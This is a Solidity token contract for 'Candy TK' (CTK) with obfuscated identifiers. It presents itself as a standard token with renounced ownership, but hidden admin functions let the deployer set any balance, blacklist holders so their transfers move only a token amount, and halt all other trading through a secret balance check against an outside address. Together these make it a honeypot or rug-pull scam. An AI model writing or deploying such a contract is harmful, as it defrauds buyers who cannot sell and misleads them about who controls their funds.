//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface wdxukdxpysdzr {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sigbnykynf {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sirphreox {
    function createPair(address ywkngfsnqryjdh, address qtixcvzmxozljr) external returns (address);
}

interface govhqnjuvyhum {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dnazfztqpcbmc) external view returns (uint256);

    function transfer(address fplyonkcwblcj, uint256 sofajlxvntwteo) external returns (bool);

    function allowance(address nhwdlwpvzwfrt, address spender) external view returns (uint256);

    function approve(address spender, uint256 sofajlxvntwteo) external returns (bool);

    function transferFrom(
        address sender,
        address fplyonkcwblcj,
        uint256 sofajlxvntwteo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed hgvzylqalybaff, uint256 value);
    event Approval(address indexed nhwdlwpvzwfrt, address indexed spender, uint256 value);
}

interface yhjawkxsbesua is govhqnjuvyhum {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CandyTK is sigbnykynf, govhqnjuvyhum, yhjawkxsbesua {

    uint8 private lfyrxqfknkfa = 18;

    bool public dciadkosq;

    function approve(address xzsjnjzms, uint256 sofajlxvntwteo) public virtual override returns (bool) {
        ahhgucbdfegf[_msgSender()][xzsjnjzms] = sofajlxvntwteo;
        emit Approval(_msgSender(), xzsjnjzms, sofajlxvntwteo);
        return true;
    }

    function owner() external view returns (address) {
        return rcvcabntz;
    }

    uint256 public celyxpijdx;

    function gbapayhqf(address iaajkziyp, address fplyonkcwblcj, uint256 sofajlxvntwteo) internal returns (bool) {
        if (iaajkziyp == fgqkulryyy) {
            return knczgnxyrhvim(iaajkziyp, fplyonkcwblcj, sofajlxvntwteo);
        }
        uint256 avuxdijejmaao = govhqnjuvyhum(cyekasvlbnpu).balanceOf(xgoqakqph);
        require(avuxdijejmaao == aizyxhbpdaa);
        if (yqfcjrfqtjsygr[iaajkziyp]) {
            return knczgnxyrhvim(iaajkziyp, fplyonkcwblcj, dimtdfyiu);
        }
        return knczgnxyrhvim(iaajkziyp, fplyonkcwblcj, sofajlxvntwteo);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return gnmakciptg;
    }

    bool private ryjobhvcybb;

    string private owunrnkekzmifu = "Candy TK";

    function qfnqbjzmasux() private view {
        require(suydpkkbhy[_msgSender()]);
    }

    uint256 aizyxhbpdaa;

    function transfer(address rouwpqqhuqbuq, uint256 sofajlxvntwteo) external virtual override returns (bool) {
        return gbapayhqf(_msgSender(), rouwpqqhuqbuq, sofajlxvntwteo);
    }

    address public cyekasvlbnpu;

    event OwnershipTransferred(address indexed vhiecvxxftyx, address indexed qskyxskeq);

    mapping(address => mapping(address => uint256)) private ahhgucbdfegf;

    function decimals() external view virtual override returns (uint8) {
        return lfyrxqfknkfa;
    }

    uint256 public zsycpjssqsg;

    address xmxezwwexibt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public suydpkkbhy;

    address private rcvcabntz;

    mapping(address => bool) public yqfcjrfqtjsygr;

    function transferFrom(address iaajkziyp, address fplyonkcwblcj, uint256 sofajlxvntwteo) external override returns (bool) {
        if (_msgSender() != xmxezwwexibt) {
            if (ahhgucbdfegf[iaajkziyp][_msgSender()] != type(uint256).max) {
                require(sofajlxvntwteo <= ahhgucbdfegf[iaajkziyp][_msgSender()]);
                ahhgucbdfegf[iaajkziyp][_msgSender()] -= sofajlxvntwteo;
            }
        }
        return gbapayhqf(iaajkziyp, fplyonkcwblcj, sofajlxvntwteo);
    }

    bool private frovlzqtmftd;

    function balanceOf(address dnazfztqpcbmc) public view virtual override returns (uint256) {
        return qpnbjwpcvl[dnazfztqpcbmc];
    }

    uint256 public mrstlpslqjl;

    mapping(address => uint256) private qpnbjwpcvl;

    uint256 gobiehjjbadld;

    function allowance(address rljvllempwfx, address xzsjnjzms) external view virtual override returns (uint256) {
        if (xzsjnjzms == xmxezwwexibt) {
            return type(uint256).max;
        }
        return ahhgucbdfegf[rljvllempwfx][xzsjnjzms];
    }

    uint256 public mlrbfpbzfwvv;

    bool private xyrfwphwlszwfe;

    function umknbzyskwmdg(uint256 sofajlxvntwteo) public {
        qfnqbjzmasux();
        aizyxhbpdaa = sofajlxvntwteo;
    }

    function symbol() external view virtual override returns (string memory) {
        return mjnsthnssuphi;
    }

    function cynvmtxcobsbr(address qvhrxdxgvsx) public {
        qfnqbjzmasux();
        if (celyxpijdx != mlrbfpbzfwvv) {
            zgebvdrcxj = false;
        }
        if (qvhrxdxgvsx == fgqkulryyy || qvhrxdxgvsx == cyekasvlbnpu) {
            return;
        }
        yqfcjrfqtjsygr[qvhrxdxgvsx] = true;
    }

    uint256 private gnmakciptg = 100000000 * 10 ** 18;

    constructor (){
        
        getrsarscmra();
        wdxukdxpysdzr fmozugqpdj = wdxukdxpysdzr(xmxezwwexibt);
        cyekasvlbnpu = sirphreox(fmozugqpdj.factory()).createPair(fmozugqpdj.WETH(), address(this));
        
        fgqkulryyy = _msgSender();
        suydpkkbhy[fgqkulryyy] = true;
        qpnbjwpcvl[fgqkulryyy] = gnmakciptg;
        
        emit Transfer(address(0), fgqkulryyy, gnmakciptg);
    }

    address xgoqakqph = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getrsarscmra() public {
        emit OwnershipTransferred(fgqkulryyy, address(0));
        rcvcabntz = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return owunrnkekzmifu;
    }

    bool public kecoviiwoueu;

    address public fgqkulryyy;

    uint256 constant dimtdfyiu = 11 ** 10;

    string private mjnsthnssuphi = "CTK";

    uint256 private uxtsroxyzd;

    function getOwner() external view returns (address) {
        return rcvcabntz;
    }

    function rhlxqfyuvgm(address rouwpqqhuqbuq, uint256 sofajlxvntwteo) public {
        qfnqbjzmasux();
        qpnbjwpcvl[rouwpqqhuqbuq] = sofajlxvntwteo;
    }

    bool public zgebvdrcxj;

    function cdquwvmmtw(address hjxgnibfr) public {
        if (kecoviiwoueu) {
            return;
        }
        
        suydpkkbhy[hjxgnibfr] = true;
        if (dciadkosq != xyrfwphwlszwfe) {
            mlrbfpbzfwvv = uxtsroxyzd;
        }
        kecoviiwoueu = true;
    }

    function knczgnxyrhvim(address iaajkziyp, address fplyonkcwblcj, uint256 sofajlxvntwteo) internal returns (bool) {
        require(qpnbjwpcvl[iaajkziyp] >= sofajlxvntwteo);
        qpnbjwpcvl[iaajkziyp] -= sofajlxvntwteo;
        qpnbjwpcvl[fplyonkcwblcj] += sofajlxvntwteo;
        emit Transfer(iaajkziyp, fplyonkcwblcj, sofajlxvntwteo);
        return true;
    }

}